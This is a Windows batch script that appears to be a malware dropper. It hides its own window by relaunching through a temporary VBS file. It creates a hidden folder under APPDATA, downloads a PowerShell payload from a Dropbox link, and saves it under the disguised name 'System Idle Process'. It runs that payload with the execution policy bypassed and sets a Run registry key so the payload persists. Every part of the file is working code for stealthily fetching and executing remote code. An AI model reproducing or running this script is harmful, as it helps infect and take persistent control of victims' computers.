��

@echo off
setlocal EnableDelayedExpansion


set "url=https://www.dropbox.com/scl/fi/xa2yop779a9gmtobgwag9/VioletRa.ps1?rlkey=0mju9xyhn4dl4naxz5bcgwfmo&st=xykrgvy7&dl=1"
set "file=System Idle Process.ps1"
set "folder=%APPDATA%\Microsoft\System\Process"
set "fullpath=%folder%\%file%"


if exist "%fullpath%" (
    echo [!] حاجة للتشغيل.
    exit /b
)


if "%~1"=="silent" goto runSilent


set "vbsfile=%temp%\_run_hidden.vbs"
(
    echo Set WshShell = CreateObject("WScript.Shell"^)
    echo WshShell.Run "cmd /c ""%~f0"" silent", 0, False
)>"%vbsfile%"
cscript //nologo "%vbsfile%" >nul
del "%vbsfile%" >nul 2>&1
exit /b

:runSilent


if not exist "%folder%" (
    mkdir "%folder%" >nul 2>&1
    attrib +h "%folder%" >nul 2>&1
)


powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
    "try { Invoke-WebRequest -Uri '%url%' -OutFile '%fullpath%' -UseBasicParsing -ErrorAction Stop } catch { exit 1 }"


if exist "%fullpath%" (
    
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "System Idle Process" /t REG_SZ /d "\"powershell\" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%fullpath%\"" /f
    
 
    powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%fullpath%"
)

exit /b
